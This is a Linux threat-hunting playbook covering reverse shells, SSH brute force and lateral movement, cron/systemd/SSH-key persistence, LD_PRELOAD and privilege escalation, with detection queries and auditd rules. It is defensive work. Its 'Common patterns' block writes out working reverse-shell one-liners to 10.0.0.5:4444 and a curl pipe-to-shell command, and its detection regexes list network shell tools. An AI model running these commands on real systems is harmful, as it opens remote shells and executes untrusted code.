---
title: "Playbook: Linux Hunting"
permalink: /hunt/playbooks/linux-hunting/
excerpt: "SSH abuse, reverse shells, cron/systemd/SSH-key persistence, LD_PRELOAD, and suspicious execution on Linux servers."
---

| Field | Detail |
|---|---|
| **ATT&CK** | T1059.004 (Unix Shell), T1053.003 (Cron), T1543.002 (Systemd Service), T1098.004 (SSH Authorized Keys), T1574.006 (LD_PRELOAD), T1136.001, T1021.004 (SSH), T1070.003/.004 (history/file deletion), T1611 (container escape) |
| **Tactics** | Execution, Persistence, Lateral Movement, Defense Evasion |
| **Data** | auditd (`execve`, file watches), `/var/log/auth.log` or `secure`, journald, syslog; EDR for Linux/eBPF; osquery; Zeek |
| **Time-box** | 3-6 hours |
| **Difficulty** | ★★☆ |

Linux telemetry is often the weakest in an enterprise. Hunt #0 is *confirm you have `execve` auditing or an EDR on your Linux servers*. See [Linux logs & auditd]({{ site.baseurl }}/cheatsheets/linux-logs-auditd/).

## Hypothesis

> *An adversary on a Linux server will execute shells and download tools from unusual parents, add persistence via cron/systemd/SSH keys, hide with LD_PRELOAD or deleted binaries, and move laterally over SSH using stolen keys.*

## Hunt steps

### 1. Reverse shells and suspicious interpreters

```spl
index=linux sourcetype=linux_audit type=EXECVE
| regex a0_args="(?i)(bash -i|/dev/tcp/|/dev/udp/|nc(at)? .* -e|mkfifo|socat .*exec|python.*socket.*connect|perl.*socket|ruby.*TCPSocket|php.*fsockopen)"
```

Common patterns:

```text
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.0.0.5",4444)); ...'
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 4444 > /tmp/f
curl http://x/y.sh | bash          # pipe-to-shell
```

```kql
// Defender for Endpoint on Linux / Syslog-based
DeviceProcessEvents
| where Timestamp > ago(30d) and DeviceName in~ (LinuxServers)
| where ProcessCommandLine has_any ("/dev/tcp/","/dev/udp/","mkfifo","socat","nc -e","ncat -e","bash -i")
   or ProcessCommandLine matches regex @"(curl|wget).*\|\s*(ba)?sh"
```

Better still, hunt **network connections whose initiating process is a shell** (`bash`, `sh`, `dash`): EDR network events or auditd `connect` syscalls.

### 2. SSH: brute force, key use and lateral movement

```bash
# Successful logins with source IP, last 7 days (Debian/Ubuntu)
grep -E 'Accepted (password|publickey)' /var/log/auth.log* | awk '{print $1,$2,$3,$9,$11}' | sort | uniq -c | sort -rn | head -50
# RHEL family: /var/log/secure
```

```spl
index=linux sourcetype=linux_secure "Failed password" 
| rex "from (?<src>\d+\.\d+\.\d+\.\d+)" 
| stats count dc(user) as users by src | where count>20 
```

Pivot: a **success after many failures** from the same source; root login over SSH; service accounts (`www-data`, `postgres`) with a login shell; key-based logins from a host that never SSHes to this one; SSH sessions originating from servers (peer-to-peer).

### 3. Persistence: cron, systemd, rc, profile scripts

```bash
# Cron
cat /etc/crontab; ls -la /etc/cron.*; for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null | sed "s/^/$u: /"; done
# Systemd units modified recently, outside package manager
find /etc/systemd/system /usr/lib/systemd/system ~/.config/systemd -name '*.service' -mtime -14 -ls
# Shell init and rc files
ls -la /etc/profile.d /etc/rc.local ~/.bashrc ~/.profile 2>/dev/null
# Authorised keys (everywhere)
find / -name authorized_keys -exec ls -la {} \; -exec cat {} \; 2>/dev/null
```

Add **auditd file watches** so you catch these changes live:

```text
-w /etc/crontab -p wa -k persistence
-w /etc/cron.d/ -p wa -k persistence
-w /var/spool/cron/ -p wa -k persistence
-w /etc/systemd/system/ -p wa -k persistence
-w /etc/ssh/sshd_config -p wa -k sshd_config
-w /root/.ssh/ -p wa -k ssh_keys
-w /etc/ld.so.preload -p wa -k ld_preload
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k sudoers
-w /etc/sudoers.d/ -p wa -k sudoers
```

Stack unit names/cron commands across your fleet; anything unique to one host with `curl|wget|bash -c|base64 -d|/tmp|/dev/shm` is a lead.

### 4. Hiding and tampering

- `/etc/ld.so.preload` exists or `LD_PRELOAD` set in service environment (userland rootkit)
- Processes running from `(deleted)` binaries: `ls -l /proc/*/exe 2>/dev/null | grep deleted`
- Executables running from `/tmp`, `/dev/shm`, `/var/tmp`: `ls -l /proc/*/exe 2>/dev/null | grep -E '/tmp|/dev/shm'`
- History tampering: `HISTFILE=/dev/null`, `unset HISTFILE`, `history -c`, symlinked `.bash_history` to `/dev/null`
- Hidden listening ports: compare `ss -tulpn` to `netstat`/ `lsof -i` and to network scans from another host
- New UID 0 accounts: `awk -F: '$3==0' /etc/passwd`
- Kernel module loads: `lsmod`, auditd `init_module/finit_module` syscalls

### 5. Privilege escalation and discovery

`sudo` abuse (`journalctl _COMM=sudo`), SUID/GTFOBins usage (`find / -perm -4000`), reads of `/etc/shadow`, enumeration scripts (`linpeas.sh`, `pspy`, `LinEnum.sh`) in command lines, container escape indicators (`docker.sock` mount, `--privileged`, `nsenter`, `/proc/1/root`).

```spl
index=linux sourcetype=linux_audit type=EXECVE (a0=find a1="/" a2="-perm*") OR a0="linpeas*" OR a0="pspy*"
```

### 6. Network hunting for Linux servers

Servers should have **narrow, predictable egress**. Stack outbound destinations per server role and flag new ones. SSH, SMB, or database protocols between servers that don't normally talk are lateral movement. Apply the [beaconing playbook]({{ site.baseurl }}/hunt/playbooks/c2-beaconing/).

## Triage

1. Who is the user and how did they log in (SSH key fingerprint, source)?
2. Process tree: `ps -ef --forest`, `/proc/<pid>/{cmdline,exe,environ,cwd}`, open files/sockets (`lsof -p`).
3. Timeline from file mtimes/ctimes (`find / -newermt ...`), `last`, `lastb`, `journalctl`.
4. Preserve volatile data first (memory via LiME/AVML, process list, connections) before reboot.

## Common false positives

Config-management agents (Ansible, Puppet, Chef) changing cron/systemd; monitoring agents; developers testing sockets; backup scripts using `nc`/`ssh`.

## Escalate when

Reverse-shell patterns, unexplained UID 0 accounts or SSH keys, `ld.so.preload`, binaries executing from `/tmp`/`/dev/shm` with network connections, or deleted-binary processes.

## Validate and operationalise

- Emulate: Atomic Red Team Linux tests (`T1053.003`, `T1059.004`, `T1098.004`, `T1574.006`) in a throwaway VM.
- Detection: [Reverse shell command lines]({{ site.baseurl }}/research/sigma/T1059.004-linux-reverse-shell.yml)
- Hardening: SSH key management and `AuthorizedKeysFile` restrictions, disable password SSH, `noexec` on `/tmp` `/dev/shm`, immutable audit rules (`-e 2`), centralised auth/auditd logs, EDR on Linux.
